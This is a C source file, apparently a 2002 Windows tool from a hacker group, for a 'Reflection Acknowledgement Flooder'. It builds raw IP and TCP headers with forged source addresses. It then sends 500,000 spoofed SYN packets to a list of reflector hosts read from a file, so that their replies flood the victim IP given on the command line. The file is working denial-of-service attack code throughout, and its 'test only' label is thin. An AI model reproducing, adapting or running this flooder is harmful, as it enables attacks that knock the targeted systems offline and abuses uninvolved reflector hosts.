/////Reflection Acknowledgement Flooder by 小金 （2002年9月）
/////更改此代码请给我一份拷贝
/////E-MAIL：LK007@163.com Anpolise@s8s8.net
////============================================
#include <winsock2.h> 
#include <ws2tcpip.h> 

#define false 0
#define true 1

#define SEQ 0x28376839 

int x=-1,k,j;
int rndX=0;

struct IP
{
	char ip[20];
};

struct IP IPtemp[32767];

typedef struct ip_hdr		//	定义IP首部 
{
	unsigned char h_verlen;		//	4位首部长度,4位IP版本号 
	unsigned char tos;		//	8位服务类型TOS 
	unsigned short total_len;	//	16位总长度（字节） 
	unsigned short ident;		//	16位标识 
	unsigned short frag_and_flags;	//	3位标志位 
	unsigned char ttl;		//	8位生存时间 TTL 
	unsigned char proto;		//	8位协议 (TCP, UDP 或其他) 
	unsigned short checksum;	//	16位IP首部校验和 
	unsigned int sourceIP;		//	32位源IP地址 
	unsigned int destIP;		//	32位目的IP地址 
}IP_HEADER; 

typedef struct tsd_hdr		//	定义TCP伪首部 
{ 
	unsigned long saddr;	//	源地址 
	unsigned long daddr;	//	目的地址 
	char mbz; 
	char ptcl;		//	协议类型 
	unsigned short tcpl;	//	TCP长度 
}PSD_HEADER; 

typedef struct tcp_hdr		//定义TCP首部 
{ 
	USHORT th_sport;		//	16位源端口 
	USHORT th_dport;		//	16位目的端口 
	unsigned int th_seq;		//	32位序列号 
	unsigned int th_ack;		//	32位确认号 
	unsigned char th_lenres;	//	4位首部长度/6位保留字 
	unsigned char th_flag;		//	6位标志位 
	USHORT th_win;			//	16位窗口大小 
	USHORT th_sum;			//	16位校验和 
	USHORT th_urp;			//	16位紧急数据偏移量 
}TCP_HEADER; 

int GetIPNum()
{
	int i;
	if(rndX++==65536) rndX=1; //序列号循环 
	srand(rndX); 
	i=rand()%x+1;
	return i;
}

//CheckSum:计算校验和的子函数 
USHORT checksum(USHORT *buffer, int size) 
{ 
	unsigned long cksum=0; 
	while(size >1) 
	{ 
		cksum+=*buffer++; 
		size -=sizeof(USHORT); 
	} 
	if(size ) 
	{ 
		cksum += *(UCHAR*)buffer; 
	} 
	
	cksum = (cksum >> 16) + (cksum & 0xffff); 
	cksum += (cksum >>16); 
	return (USHORT)(~cksum); 
} 

unsigned long resolve(char *host)
{
	long i;
	struct hostent *he;
	
	if ( ( i = inet_addr(host) ) < 0 )
	{
		if ( ( he = gethostbyname(host) ) == NULL )
		{
			return 0;
		}
		else
		{
			return ( *(unsigned long *)he->h_addr );
		}
		return i;
	}
}

void Intro()
{
	printf("==================R-Series=====================\n");
	printf("H.B.U Team R-Series Tools DEMO Version\n");
	printf("\n");
	printf("-=-=-Reflection Acknowledgement Flooder-=-=-\n");
	printf("\n");
	printf("&copy;2002 HBU Team,written by LK007\n");
	printf("E-MAIL:lk007@163.com cjc007@cnuninet.com\n");
	printf("Please visit: www.s8s8.net www.heibai.net\n");
	printf("===============================================\n");
	printf("WARNING!TEST ONLY!\n");
	printf("This Version can only send 500,000 packets!\n\n");
	////printf("RELEASE VERSION,NO PACKET LIMIT!");
}

void LoadFile()
{
	FILE *fp;
	char str[256];
	if((fp=fopen("ack.txt","rt"))==NULL)
	{
		printf("Can not open Reflection-IP List!\n");
		printf("Please create a text file 'ack.txt' which\n");
		printf("includes Reflection-IP(s) on the Application Path!\n");
		exit(0);
	}
	while (!feof(fp))
	{
		fgets(str,sizeof(str),fp);
		x++;
		for (k=0;k<16;k++)
		{
			if(str[k]=='\n'){
				str[k]='\0';}
			
			IPtemp[x].ip[k]=str[k];
		}
	}
	fclose(fp);
	printf("Loading Reflection IP List...\n\n");
	printf("Reflection IP List Loaded.\n");
	printf("\nTotal IP List:%d\n\n",x);
}

int main(int argc, char **argv) 
{ 
	WSADATA WSAData; 
	SOCKET SockRaw; 
	struct sockaddr_in DestAddr; 
	IP_HEADER ip_header; 
	TCP_HEADER tcp_header; 
	PSD_HEADER psd_header; 
	
	char SendBuf[128]={0};
	char FakeSourceIp[20];
	char DestIp[20];
	BOOL flag;
	BOOL TCPNODELAY = true; 
	int SYN,datasize; 
	long counter;
	int SendSEQ=0,TimeOut=2000;
	int intPort=80;
	int destPort=80;
	
	if (argc<2)
	{ 
		Intro();
		printf("Usage: %s [DestIP]\n",argv[0]);
		exit(0); 
	} 
	
	strcpy(FakeSourceIp,argv[1]);
	Intro();
	LoadFile();
	
	
	if (WSAStartup(MAKEWORD(2,2), &WSAData)!=0) 
	{ 
		printf("WSAStartup Error!\n"); 
		return false; 
	} 
	
	if ((SockRaw=WSASocket(AF_INET,SOCK_RAW,IPPROTO_RAW,NULL,0,WSA_FLAG_OVERLAPPED))==INVALID_SOCKET) 
	{ 
		printf("无法创建Socket套接字!\n"); 
		return false; 
	} 
	
	flag=true; 
	if (setsockopt(SockRaw,IPPROTO_IP, IP_HDRINCL,(char *)&flag,sizeof(flag))==SOCKET_ERROR) 
	{ 
		printf("设置IP数据失败!此程序需要Win2000/XP支持!\n"); 
		return false; 
	} 
	
	SYN=setsockopt(SockRaw,SOL_SOCKET,SO_SNDTIMEO,(char*)&TimeOut,sizeof(TimeOut)); 
	if(SYN==SOCKET_ERROR){ 
		fprintf(stderr,"Failed to set send TimeOut: %d\n",WSAGetLastError()); 
		return false; 
	}
	
	if (setsockopt(SockRaw, SOL_SOCKET, TCP_NODELAY, (const char*)&TCPNODELAY, sizeof(TCPNODELAY))==SOCKET_ERROR) 
	{ 
		printf("Set TCP_NODELAY failed.Error:%d",WSAGetLastError()); 
		return false; 
	} 
	
	printf("Dest Host:%s\n\n",FakeSourceIp);
	
	for ( counter = 0; counter < 500000; counter ++ )
	{
		strcpy( DestIp, IPtemp[GetIPNum()].ip );

		printf("Now using %s for Reflection...\n",DestIp);
		
		memset( &DestAddr, 0, sizeof(DestAddr) ); 
		DestAddr.sin_family		= AF_INET;
		DestAddr.sin_addr.s_addr	= inet_addr(DestIp);

		//	填充IP首部 
		ip_header.h_verlen		= ( 4 << 4 | sizeof(ip_header) / sizeof(unsigned long) );

		//	高四位IP版本号，低四位首部长度
		ip_header.total_len		= htons( sizeof(IP_HEADER)+sizeof(TCP_HEADER) );	//16位总长度（字节） 
		ip_header.ident			= 1;				//	16位标识
		ip_header.frag_and_flags	= 0;				//	3位标志位
		ip_header.ttl			= 128;				//	8位生存时间TTL 
		ip_header.proto			= IPPROTO_TCP;			//	8位协议(TCP,UDP…) 
		ip_header.checksum		= 0;				//	16位IP首部校验和 
		ip_header.sourceIP		= resolve(FakeSourceIp);	//	32位源IP地址 
		ip_header.destIP		= inet_addr(DestIp);		//	32位目的IP地址

		//	填充TCP首部
		tcp_header.th_sport		= htons(destPort);		//	源端口号 
		tcp_header.th_dport		= htons(intPort);		//	目的端口号 
		tcp_header.th_seq		= htonl(SEQ+SendSEQ);		//	SYN序列号 
		tcp_header.th_ack		= 0;				//	ACK序列号置为0 
		tcp_header.th_lenres		= (sizeof(TCP_HEADER)/4<<4|0);	//	TCP长度和保留位 
		tcp_header.th_flag		= 2;				//	SYN 标志 
		tcp_header.th_win		= htons(16384);			//	窗口大小 
		tcp_header.th_urp		= 0;				//	偏移 
		tcp_header.th_sum		= 0;				//	校验和

		//	填充TCP伪首部（用于计算校验和，并不真正发送） 
		psd_header.saddr		= ip_header.sourceIP;		//	源地址
		psd_header.daddr		= ip_header.destIP;		//	目的地址
		psd_header.mbz			= 0; 
		psd_header.ptcl			= IPPROTO_TCP;			//	协议类型 
		psd_header.tcpl			= htons(sizeof(tcp_header));	//	TCP首部长度 

		if ( SendSEQ++ == 65536 )
		{
			//	序列号循环
			SendSEQ	= 1;
		}

		//	更改IP首部
		ip_header.checksum		= 0;	//	16位IP首部校验和 
		ip_header.sourceIP		= resolve(FakeSourceIp); //32位源IP地址 

		//	更改TCP首部
		tcp_header.th_seq		= htonl(SEQ+SendSEQ); //SYN序列号 
		tcp_header.th_sum		= 0; //校验和

		//	更改 TCP Pseudo Header
		psd_header.saddr		= ip_header.sourceIP; 
		
		//
		//	拷贝数据到 SendBuf，准备发送
		//

		//	计算 TCP 校验和，计算校验和时需要包括 TCP pseudo header 
		memcpy( SendBuf, &psd_header, sizeof(psd_header) );
		memcpy( SendBuf + sizeof(psd_header), &tcp_header, sizeof(tcp_header) ); 
		tcp_header.th_sum = checksum( (USHORT*)SendBuf, sizeof(psd_header)+sizeof(tcp_header) ); 

		//	计算IP校验和 
		memcpy( SendBuf, &ip_header, sizeof(ip_header) );
		memcpy( SendBuf + sizeof(ip_header), &tcp_header, sizeof(tcp_header) );
		memset( SendBuf + sizeof(ip_header)+sizeof(tcp_header), 0, 4 );
		datasize		= sizeof(ip_header) + sizeof(tcp_header);
		ip_header.checksum	= checksum( (USHORT*)SendBuf, datasize ); 
		
		//	填充发送缓冲区 
		memcpy( SendBuf, &ip_header, sizeof(ip_header) ); 

		//	发送TCP报文 
		SYN = sendto( SockRaw, SendBuf, datasize, 0, (struct sockaddr*)&DestAddr, sizeof(DestAddr) ); 
		if ( SYN == SOCKET_ERROR )
		{
			printf("\nSend Error:%d\n",GetLastError());
		}

	}
	//	end for 
	closesocket(SockRaw); 
	WSACleanup(); 
	printf("\n\nSend Complete!\n");
	return 0; 
} 
